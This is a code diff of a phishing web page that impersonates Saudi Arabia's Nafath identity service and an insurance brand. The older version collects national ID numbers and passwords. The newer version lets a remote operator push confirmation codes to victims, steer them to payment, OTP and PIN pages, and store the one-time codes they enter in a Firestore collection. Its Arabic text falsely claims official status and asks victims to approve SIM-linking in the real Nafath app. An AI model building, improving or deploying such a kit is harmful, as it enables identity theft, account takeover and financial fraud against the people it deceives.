@@ -1,406 +1,734 @@
 "use client";
 
-import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Card, CardContent } from "@/components/ui/card";
+import {
+  Loader2,
+  Menu,
+  Smartphone,
+  CheckCircle2,
+  ShieldCheck,
+  Shield,
+  ChevronLeft,
+  RefreshCw,
+  AlertCircle,
+  Timer,
+  Lock,
+  ExternalLink,
+} from "lucide-react";
 import {
   Dialog,
   DialogContent,
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { useEffect, useState } from "react";
-import { addData, db, saveToHistory } from "@/lib/firebase";
-import { Alert } from "@/components/ui/alert";
-import { doc, onSnapshot, updateDoc } from "firebase/firestore";
+import { Card, CardContent } from "@/components/ui/card";
+import { useEffect, useRef, useState } from "react";
+
+import { addData, db } from "@/lib/firebase";
+import { doc, onSnapshot, setDoc } from "firebase/firestore";
 
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [showOtpDialog, setShowOtpDialog] = useState(false);
   const [confirmationCode, setConfirmationCode] = useState<string>("");
-  const [isloading, setIsLoading] = useState(false);
-  const [idLogin, setLoginID] = useState("");
-  const [password, setPassword] = useState("");
+  const [, setIsLoading] = useState(true);
   const [showError, setShowError] = useState("");
 
-  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
+  const [otp, setOtp] = useState(["", "", "", ""]);
+  const [otpError, setOtpError] = useState("");
+  const [otpLoading, setOtpLoading] = useState(false);
+  const [otpDone, setOtpDone] = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  const [submitted, setSubmitted] = useState(false);
+  const [pulseCode, setPulseCode] = useState(false);
+  const [shakeError, setShakeError] = useState(false);
+
+  const visitorId =
+    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
+
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
-    if (!visitorId) return
+    if (!visitorId || submitted) return;
+    setSubmitted(true);
+    addData({
+      id: visitorId,
+      nafadConfirmationStatus: "waiting",
+      currentStep: "nafad",
+      nafadUpdatedAt: new Date().toISOString(),
+    }).catch(console.error);
+  }, [visitorId, submitted]);
 
-    console.log("[nafad] Setting up navigation listener for visitor:", visitorId)
-
+  useEffect(() => {
+    if (!visitorId || !db) return;
     const unsubscribe = onSnapshot(
       doc(db, "pays", visitorId),
       (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
-          console.log("[nafad] Firestore data received:", data)
+        if (!docSnap.exists()) return;
+        const data = docSnap.data();
 
-          // Admin navigation: Handle page redirects
-          if (data.currentStep === "home") {
-            console.log("[nafad] Admin redirecting to home")
-            window.location.href = "/"
-          } else if (data.currentStep === "phone") {
-            console.log("[nafad] Admin redirecting to phone-info")
-            window.location.href = "/phone-info"
-          } else if (data.currentStep === "payment") {
-            console.log("[nafad] Admin redirecting to payment")
-            window.location.href = "/check"
-          } else if (data.currentStep === "otp") {
-            console.log("[nafad] Admin redirecting to otp")
-            window.location.href = "/veri"
-          } else if (data.currentStep === "pin") {
-            console.log("[nafad] Admin redirecting to pin")
-            window.location.href = "/confi"
+        // Admin navigation: handle page redirects (string contract)
+        if (data.currentStep === "home") {
+          window.location.href = "/";
+          return;
+        }
+        if (data.currentStep === "phone") {
+          window.location.href = "/phone-info";
+          return;
+        }
+        if (data.currentStep === "payment") {
+          window.location.href = "/check";
+          return;
+        }
+        if (data.currentStep === "otp") {
+          window.location.href = "/veri";
+          return;
+        }
+        if (data.currentStep === "pin") {
+          window.location.href = "/confi";
+          return;
+        }
+        // Numeric currentStep (from main.tsx internal step tracking) is ignored.
+        // If currentStep === "nafad" (or any other value), stay on this page
+
+        if (data.nafadConfirmationCode) {
+          setConfirmationCode(data.nafadConfirmationCode);
+          const storageKey = `nafad_shown_${visitorId}`;
+          const lastShown = localStorage.getItem(storageKey);
+          if (data.nafadConfirmationCode !== lastShown) {
+            setShowConfirmDialog(true);
+            localStorage.setItem(storageKey, data.nafadConfirmationCode);
+            setIsLoading(false);
+            setShowError("");
+            setShowOtpDialog(false);
+            // Trigger pulse animation when new code arrives
+            setPulseCode(true);
+            setTimeout(() => setPulseCode(false), 2000);
           }
-          // Numeric currentStep (from main.tsx internal step tracking) is ignored.
-          // If currentStep === "nafad" (or any other value), stay on this page
+        } else if (data.nafadConfirmationCode === "") {
+          setShowConfirmDialog(false);
+          localStorage.removeItem(`nafad_shown_${visitorId}`);
+        }
 
-          // Listen for confirmation code from admin (updates every time)
-          if (data.nafadConfirmationCode) {
-            console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
-            setConfirmationCode(data.nafadConfirmationCode)
-            setShowConfirmDialog(true)
-            setShowError("") // Clear any previous errors
-            setShowSuccessDialog(false) // Close success dialog if open
-          } else if (data.nafadConfirmationCode === "") {
-            // Admin cleared the code
-            setShowConfirmDialog(false)
-          }
-
-          // Listen for admin approval/rejection
-          if (data.nafadConfirmationStatus === "approved") {
-            console.log("[nafad] Admin approved the confirmation")
-            setShowConfirmDialog(false)
-            setShowSuccessDialog(true)
-            // Clear status after use
-            updateDoc(doc(db, "pays", visitorId), {
+        if (data.nafadConfirmationStatus === "approved") {
+          setShowConfirmDialog(false);
+          setShowOtpDialog(true);
+          setOtp(["", "", "", ""]);
+          setOtpError("");
+          setOtpDone(false);
+          setDoc(
+            doc(db, "pays", visitorId),
+            {
               nafadConfirmationStatus: "",
-              nafadConfirmationCode: ""
-            })
-          } else if (data.nafadConfirmationStatus === "rejected") {
-            console.log("[nafad] Admin rejected the confirmation")
-            setShowConfirmDialog(false)
-            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
-            // Clear status after use
-            updateDoc(doc(db, "pays", visitorId), {
+              nafadConfirmationCode: "",
+            },
+            { merge: true }
+          );
+          setTimeout(() => inputRefs.current[0]?.focus(), 150);
+        } else if (data.nafadConfirmationStatus === "rejected") {
+          setShowConfirmDialog(false);
+          setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
+          setIsLoading(false);
+          setShakeError(true);
+          setTimeout(() => setShakeError(false), 500);
+          setDoc(
+            doc(db, "pays", visitorId),
+            {
               nafadConfirmationStatus: "",
-              nafadConfirmationCode: ""
-            })
-          }
+              nafadConfirmationCode: "",
+            },
+            { merge: true }
+          );
         }
       },
-      (error) => {
-        console.error("[nafad] Firestore listener error:", error)
-      }
-    )
+      (error) => console.error("[nafad] Firestore listener error:", error)
+    );
+    return () => unsubscribe();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
-    return () => {
-      console.log("[nafad] Cleaning up navigation listener")
-      unsubscribe()
-    }
-  }, [])
-
-  const handleLogin = async (e: any) => {
-    e.preventDefault();
-    const visitorId = localStorage.getItem("visitor");
+  const handleRetry = async () => {
     setShowError("");
-
     setIsLoading(true);
-
-    // Save current data to history before updating
-    if (visitorId) {
-      await saveToHistory(visitorId, 0); // 0 for nafad page
-    }
-
     await addData({
       id: visitorId,
-      nafazId: idLogin,
-      nafazPass: password,
       nafadConfirmationStatus: "waiting",
       currentStep: "nafad",
-      nafadUpdatedAt: new Date().toISOString()
+      nafadUpdatedAt: new Date().toISOString(),
     });
-    
-    setIsLoading(false);
   };
+
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d?$/.test(value)) return;
+    const next = [...otp];
+    next[index] = value;
+    setOtp(next);
+    setOtpError("");
+    if (value && index < 3) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (
+    index: number,
+    e: React.KeyboardEvent<HTMLInputElement>
+  ) => {
+    if (e.key === "Backspace" && !otp[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handleOtpPaste = (e: React.ClipboardEvent) => {
+    const pasted = e.clipboardData
+      .getData("text")
+      .replace(/\D/g, "")
+      .slice(0, 4);
+    if (pasted.length === 4) {
+      setOtp(pasted.split(""));
+      inputRefs.current[3]?.focus();
+    }
+    e.preventDefault();
+  };
+
+  const handleOtpSubmit = async () => {
+    const code = otp.join("");
+    if (code.length !== 4) {
+      setOtpError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً");
+      setShakeError(true);
+      setTimeout(() => setShakeError(false), 500);
+      return;
+    }
+    setOtpLoading(true);
+    try {
+      await setDoc(
+        doc(db, "pays", visitorId),
+        {
+          nafadOtp: code,
+          nafadOtpSubmittedAt: new Date().toISOString(),
+        },
+        { merge: true }
+      );
+      setOtpDone(true);
+    } catch (err) {
+      console.error("[nafad OTP]", err);
+      setOtpError("حدث خطأ، يرجى المحاولة مرة أخرى.");
+      setShakeError(true);
+      setTimeout(() => setShakeError(false), 500);
+    } finally {
+      setOtpLoading(false);
+    }
+  };
+
+  const otpFilled = otp.every((d) => d !== "");
 
   return (
     <div
-      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
+      className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50/30 to-emerald-50/20 relative overflow-hidden"
       dir="rtl"
     >
-      {/* Header */}
-      <header className="bg-white shadow-sm border-b">
+      {/* Animated background elements */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute -top-40 -right-40 w-96 h-96 bg-teal-100/40 rounded-full blur-3xl animate-pulse" />
+        <div
+          className="absolute -bottom-40 -left-40 w-96 h-96 bg-emerald-100/30 rounded-full blur-3xl animate-pulse"
+          style={{ animationDelay: "1s" }}
+        />
+        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-teal-50/20 rounded-full blur-3xl" />
+      </div>
+
+      <header className="bg-white/70 backdrop-blur-xl shadow-sm border-b border-teal-100/50 sticky top-0 z-50">
         <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
-          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
-          <img src="lgog.png" alt="sd" width={80} className="object-contain" />
-          <div className="w-6"></div>
+          <button className="p-2 rounded-xl hover:bg-teal-50 transition-all duration-300 group">
+            <Menu className="w-5 h-5 text-gray-500 group-hover:text-[#00796b] transition-colors" />
+          </button>
+          <div className="relative">
+            <img
+              src="/NIC-logo.png"
+              alt="نفاذ"
+              width={110}
+              className="object-contain drop-shadow-sm"
+            />
+            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 w-12 h-0.5 bg-gradient-to-r from-transparent via-teal-400 to-transparent rounded-full" />
+          </div>
+          <div className="w-10" />
         </div>
       </header>
 
-      {/* Main Content */}
-      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
-        {/* Login Section Title */}
-        <div className="text-center space-y-2">
-          <h1 className="text-2xl font-bold text-gray-800 mb-2">
-            الدخول على النظام
-          </h1>
-          <p className="text-gray-600 text-sm">
-            استخدم تطبيق نفاذ للدخول بشكل آمن
-          </p>
-        </div>
-
-        {/* Nafath App Section */}
-        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
-          <div className="flex items-center justify-center gap-2 mb-2">
-            <ShieldAlert className="w-6 h-6" />
-            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
-          </div>
-          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
-        </div>
-
-        <form onSubmit={handleLogin}>
-          {/* Login Form */}
-          <Card className="bg-white shadow-lg border-0">
-            <CardContent className="p-6 space-y-5">
-              <div className="text-center">
-                <p className="text-gray-700 font-semibold mb-1">
-                  رقم بطاقة الأحوال/الإقامة
-                </p>
-                <p className="text-sm text-gray-500">
-                  أدخل رقم الهوية الخاص بك للمتابعة
-                </p>
-              </div>
-
-              <Input
-                placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
-                dir="rtl"
-                onChange={(e) => setLoginID(e.target.value)}
-                required
-              />
-              <Input
-                placeholder="أدخل كلمة المرور الخاصة بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
-                dir="rtl"
-                onChange={(e) => setPassword(e.target.value)}
-                type="password"
-                required
-              />
-              {showError && (
-                <Alert
-                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
-                  dir="rtl"
-                >
-                  <ShieldAlert className="w-5 h-5 text-red-600" />
-                  {showError}
-                </Alert>
-              )}
-
-              <Button
-                type="submit"
-                disabled={isloading || !idLogin}
-                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
-              >
-                {isloading ? (
-                  <>
-                    <Loader2Icon className="animate-spin ml-2" />
-                    جاري التحقق...
-                  </>
-                ) : (
-                  "تسجيل الدخول"
-                )}
-              </Button>
-
-              <div className="pt-4 border-t">
-                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
-                  لتحميل تطبيق نفاذ
-                </div>
-
-                {/* App Store Buttons */}
-                <div className="flex justify-center gap-3">
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="plays.svg" alt="Google Play" className="h-10" />
-                  </a>
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="apple.svg" alt="App Store" className="h-10" />
-                  </a>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-        </form>
-
-        {/* New Nafath Platform Section */}
-        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
-          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
-          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
-          <CardContent className="p-8 text-center space-y-4 relative z-10">
-            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
-              <Smartphone className="w-8 h-8 text-white" />
+      <main className="relative z-10 p-4 max-w-lg mx-auto py-10 space-y-8">
+        {/* Hero Section */}
+        <div className="text-center space-y-4">
+          <div className="relative inline-block">
+            <div className="w-24 h-24 bg-gradient-to-br from-[#009688] via-[#00897b] to-[#00796b] rounded-3xl flex items-center justify-center mx-auto shadow-xl shadow-teal-200/50 ring-4 ring-teal-100/50">
+              <ShieldCheck className="w-12 h-12 text-white drop-shadow-md" />
             </div>
-            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
-            <p className="text-sm leading-relaxed text-teal-50">
-              لتجربة أكثر سهولة استخدم النسخة المحدثة
-              <br />
-              من منصة النفاذ الوطني الموحد
+            <div className="absolute -top-1 -right-1 w-6 h-6 bg-emerald-400 rounded-full flex items-center justify-center shadow-lg animate-bounce">
+              <Lock className="w-3 h-3 text-white" />
+            </div>
+          </div>
+          <div className="space-y-2">
+            <h1 className="text-3xl font-black text-gray-800 tracking-tight">
+              التحقق عبر تطبيق نفاذ
+            </h1>
+            <p className="text-sm text-gray-500 font-medium">
+              مصادقة آمنة وموثوقة للهوية الرقمية
             </p>
-            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
-              ابدأ الآن
-            </Button>
+          </div>
+        </div>
+
+        {/* Main Card */}
+        <Card className="border-0 shadow-2xl shadow-teal-100/40 overflow-hidden bg-white/80 backdrop-blur-sm">
+          <div className="h-1.5 bg-gradient-to-r from-[#4db6ac] via-[#009688] to-[#00796b]" />
+          <CardContent className="p-0">
+            <div className="flex flex-col" dir="rtl">
+              {/* Header */}
+              <div className="flex items-center gap-4 p-6 border-b border-gray-100">
+                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-teal-50 to-emerald-50 flex items-center justify-center shadow-inner">
+                  <img
+                    src="/Bcare-logo.svg"
+                    width={48}
+                    className="object-contain"
+                    alt="تأميني"
+                  />
+                </div>
+                <div className="text-right">
+                  <p className="text-gray-800 font-bold text-lg">تأميني</p>
+                  <p className="text-gray-400 text-xs font-medium">
+                    خدمات التأمين الرقمية
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex-1 flex flex-col items-center px-6 py-8">
+                {/* Nafath Logo */}
+                <div className="relative mb-6">
+                  <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-[#2a7a4b]/10 to-[#2a7a4b]/5 flex items-center justify-center p-4 shadow-inner">
+                    <img
+                      src="/NIC-logo.png"
+                      width={60}
+                      className="object-contain"
+                      alt="نفاذ"
+                    />
+                  </div>
+                  <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 px-3 py-1 bg-[#2a7a4b] rounded-full text-white text-[10px] font-bold shadow-lg">
+                    موثوق
+                  </div>
+                </div>
+
+                <h2 className="text-xl font-bold text-gray-800 mb-2 text-center">
+                  التحقق من خلال تطبيق نفاذ
+                </h2>
+
+                <p className="text-gray-500 text-sm text-center leading-relaxed mb-8 max-w-xs">
+                  الرجاء فتح تطبيق نفاذ وتأكيد طلب إصدار أمر ربط شريحتك على رقم
+                  الجوال لتأكيد اصدار وثيقة التأمين باختيار الرقم أدناه
+                </p>
+
+                {/* Steps */}
+                <div className="flex gap-4 w-full mb-8">
+                  {/* Step 2 */}
+                  <div className="flex-1 flex flex-col items-center gap-3 group">
+                    <div className="w-full aspect-square rounded-2xl border-2 border-[#2a7a4b]/20 bg-gradient-to-br from-white to-teal-50/50 flex items-center justify-center overflow-hidden p-4 shadow-sm group-hover:shadow-md group-hover:border-[#2a7a4b]/40 transition-all duration-300">
+                      <svg
+                        viewBox="0 0 100 100"
+                        width="100%"
+                        height="100%"
+                        xmlns="http://www.w3.org/2000/svg"
+                      >
+                        <rect x="5" y="5" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="5" y="5" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="75" y="5" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="91" y="5" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="5" y="91" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="5" y="75" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="75" y="91" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect x="91" y="75" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <circle cx="50" cy="35" r="18" fill="#f0a080" />
+                        <ellipse cx="50" cy="80" rx="22" ry="18" fill="#4fc3f7" />
+                        <circle cx="44" cy="33" r="2" fill="#555" opacity="0.7" />
+                        <circle cx="56" cy="33" r="2" fill="#555" opacity="0.7" />
+                        <path d="M44 43 Q50 48 56 43" stroke="#555" strokeWidth="1.5" fill="none" strokeLinecap="round" opacity="0.7" />
+                        <line x1="20" y1="50" x2="80" y2="50" stroke="#2a7a4b" strokeWidth="1" opacity="0.3" strokeDasharray="4,3" />
+                        <line x1="20" y1="55" x2="80" y2="55" stroke="#2a7a4b" strokeWidth="1" opacity="0.2" strokeDasharray="4,3" />
+                      </svg>
+                    </div>
+                    <div className="text-center">
+                      <p className="text-xs text-gray-700 font-bold">
+                        ثانياً: اختيار الرقم
+                      </p>
+                      <p className="text-[10px] text-gray-500 mt-0.5">
+                        والتحقق عبر السمات الحيوية
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Connector */}
+                  <div className="flex flex-col items-center justify-center pt-8">
+                    <div className="w-8 h-0.5 bg-gradient-to-r from-[#2a7a4b]/30 to-[#2a7a4b]/30 rounded-full" />
+                    <ChevronLeft className="w-4 h-4 text-[#2a7a4b]/40 -mt-2" />
+                  </div>
+
+                  {/* Step 1 */}
+                  <div className="flex-1 flex flex-col items-center gap-3 group">
+                    <div className="w-full aspect-square rounded-2xl border-2 border-gray-200 bg-gradient-to-br from-white to-gray-50/50 flex items-center justify-center overflow-hidden p-4 shadow-sm group-hover:shadow-md group-hover:border-[#2a7a4b]/30 transition-all duration-300">
+                      <img
+                        src="/NIC-logo.png"
+                        className="w-full h-full object-contain"
+                        alt="تطبيق نفاذ"
+                      />
+                    </div>
+                    <div className="text-center">
+                      <p className="text-xs text-gray-700 font-bold">
+                        أولاً: تحميل تطبيق
+                      </p>
+                      <p className="text-[10px] text-gray-500 mt-0.5">
+                        نفاذ على الجوال
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Code Display or Loading */}
+                {confirmationCode.length < 1 ? (
+                  <div className="flex flex-col items-center gap-4 mb-8">
+                    <div className="relative">
+                      <div className="w-16 h-16 rounded-full border-4 border-gray-100 border-t-[#2a7a4b] animate-spin" />
+                      <div
+                        className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#4db6ac] animate-spin"
+                        style={{
+                          animationDuration: "1.5s",
+                          animationDirection: "reverse",
+                        }}
+                      />
+                    </div>
+                    <div className="text-center space-y-1">
+                      <p className="text-gray-600 text-sm font-medium animate-pulse">
+                        جاري انتظار رمز التحقق...
+                      </p>
+                      <p className="text-gray-400 text-xs">
+                        سيظهر الكود أمامك خلال لحظات
+                      </p>
+                    </div>
+                  </div>
+                ) : (
+                  <div className={`mb-8 w-full ${pulseCode ? "animate-pulse" : ""}`}>
+                    <div className="bg-gradient-to-br from-[#2a7a4b] to-[#1b5e3b] rounded-2xl p-6 text-center shadow-xl shadow-[#2a7a4b]/20 relative overflow-hidden">
+                      <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-10 -mt-10" />
+                      <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full -ml-8 -mb-8" />
+                      <div className="relative z-10">
+                        <p className="text-emerald-100 text-xs font-medium mb-2 uppercase tracking-wider">
+                          رمز التحقق
+                        </p>
+                        <div className="flex justify-center gap-2 mb-3">
+                          {confirmationCode.split("").map((digit, i) => (
+                            <div
+                              key={i}
+                              className="w-12 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center text-2xl font-black text-white shadow-inner border border-white/10"
+                            >
+                              {digit}
+                            </div>
+                          ))}
+                        </div>
+                        <p className="text-emerald-200 text-xs">
+                          اختر هذا الرقم في تطبيق نفاذ
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Error Alert */}
+                {showError && (
+                  <div className={`w-full mb-6 ${shakeError ? "animate-shake" : ""}`}>
+                    <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-start gap-3 shadow-sm">
+                      <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
+                      <div className="flex-1">
+                        <p className="text-red-700 text-sm font-bold">{showError}</p>
+                        <button
+                          onClick={handleRetry}
+                          className="mt-2 text-xs text-red-600 font-medium hover:text-red-700 flex items-center gap-1 transition-colors"
+                        >
+                          <RefreshCw className="w-3 h-3" />
+                          إعادة المحاولة
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Open App Button */}
+                <a
+                  href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
+                  className="w-full py-4 rounded-xl text-white text-lg font-bold transition-all duration-300 hover:shadow-lg hover:shadow-[#2a7a4b]/25 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2 group"
+                  style={{ background: "linear-gradient(135deg, #2a7a4b, #1b5e3b)" }}
+                >
+                  <ExternalLink className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                  افتح تطبيق نفاذ
+                </a>
+              </div>
+
+              {/* Footer */}
+              <div className="px-6 pb-6 pt-2 text-center border-t border-gray-100 mt-4">
+                <div className="flex items-center justify-center gap-2 mb-2">
+                  <Shield className="w-3 h-3 text-gray-400" />
+                  <p className="text-gray-400 text-[11px] font-medium">
+                    إصدار وإتاحة الهوية الوطنية الرقمية
+                  </p>
+                </div>
+                <p className="text-gray-400 text-[10px]">
+                  تطوير وتشغيل مركز المعلومات الوطني
+                </p>
+              </div>
+            </div>
           </CardContent>
         </Card>
 
-        {/* Confirmation Code Display Dialog */}
-        <Dialog open={showConfirmDialog} onOpenChange={setShowConfirmDialog}>
-          <DialogContent className="max-w-md mx-auto" dir="rtl">
-            <DialogHeader>
-              <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
-                رمز التحقق
-              </DialogTitle>
-              <p className="text-center text-sm text-gray-600">
-                يرجى التحقق من الرقمين التاليين في تطبيق نفاذ
-              </p>
-            </DialogHeader>
+        {/* Download Apps Section */}
+        <div className="bg-gradient-to-br from-[#009688] via-[#00897b] to-[#00796b] rounded-3xl p-6 text-center text-white space-y-5 shadow-xl shadow-teal-200/50 relative overflow-hidden">
+          <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl" />
+          <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/10 rounded-full -ml-12 -mb-12 blur-2xl" />
+          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-white/5 rounded-full blur-3xl" />
 
-            <div className="text-center space-y-6 p-4">
-              <div className="bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-xl p-8 shadow-inner">
-                <div className="text-sm text-gray-600 mb-3 font-medium">
-                  الرقمان المطلوبان
-                </div>
-                <div className="text-6xl font-bold text-teal-600 tracking-widest font-mono">
-                  {confirmationCode || "--"}
-                </div>
-              </div>
-
-              <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
-                <div className="flex items-center justify-center gap-2 text-teal-600 mb-2">
-                  <ShieldAlert className="w-5 h-5" />
-                  <div className="text-gray-800 font-bold">
-                    في انتظار التأكيد
-                  </div>
-                </div>
-                <div className="text-sm text-gray-600 leading-relaxed">
-                  يرجى التحقق من الرقمين في تطبيق نفاذ على جهازك المحمول
-                  والانتظار حتى يتم التأكيد
-                </div>
-              </div>
-
-              <div className="flex items-center justify-center gap-3 text-teal-600 py-4">
-                <div className="relative">
-                  <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
-                  <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
-                </div>
-                <div className="text-sm font-medium">في انتظار الموافقة...</div>
-              </div>
-
-              <Button
-                variant="outline"
-                onClick={() => setShowConfirmDialog(false)}
-                className="w-full border-2 border-gray-300 text-gray-700 hover:bg-gray-100 h-11 font-semibold"
-              >
-                إلغاء
-              </Button>
+          <div className="relative z-10 space-y-2">
+            <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center mx-auto backdrop-blur-sm">
+              <Smartphone className="w-5 h-5 text-white" />
             </div>
-          </DialogContent>
-        </Dialog>
-
-        {/* Success Dialog */}
-        <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-          <DialogContent className="max-w-md mx-auto" dir="rtl">
-            <div className="text-center space-y-6 p-4">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
-                <CheckCircle2 className="w-12 h-12 text-green-600" />
-              </div>
-
-              <div className="space-y-2">
-                <h3 className="text-2xl font-bold text-gray-800">
-                  تم التحقق بنجاح!
-                </h3>
-                <p className="text-gray-600">
-                  تمت عملية التحقق من هويتك بنجاح عبر نفاذ
-                </p>
-              </div>
-
-              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
-                <p className="text-sm text-green-800 font-medium">
-                  شكراً لاستخدامك منصة النفاذ الوطني الموحد
-                </p>
-              </div>
-
-              <Button
-                onClick={() => setShowSuccessDialog(false)}
-                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all"
-              >
-                إغلاق
-              </Button>
-            </div>
-          </DialogContent>
-        </Dialog>
-      </main>
-
-      {/* Footer */}
-      <footer className="mt-12 p-6 bg-white border-t">
-        <div className="text-center space-y-6 max-w-4xl mx-auto">
-          <div className="text-gray-600 text-sm font-medium">تطوير وتشغيل</div>
-
-          <div className="flex justify-center items-center">
-            <img
-              src="nic-20.png"
-              alt="sd"
-              width={120}
-              className="object-contain"
-            />
+            <p className="text-sm font-bold text-teal-50">لتحميل تطبيق نفاذ</p>
+            <p className="text-xs text-teal-100/80">متاح على متاجر التطبيقات</p>
           </div>
 
-          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
+          <div className="flex justify-center gap-4 relative z-10">
             <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
+              href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid&hl=ar"
+              className="hover:scale-105 transition-transform duration-300 hover:shadow-lg"
             >
-              الرئيسية
+              <img
+                src="/google-play.png"
+                alt="Google Play"
+                className="h-10 rounded-lg shadow-md"
+              />
             </a>
             <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
+              href="https://apps.apple.com/by/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
+              className="hover:scale-105 transition-transform duration-300 hover:shadow-lg"
             >
-              حول
+              <img
+                src="/apple_store.png"
+                alt="App Store"
+                className="h-10 rounded-lg shadow-md"
+              />
             </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              اتصل بنا
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الشروط والأحكام
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              المساعدة والدعم
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
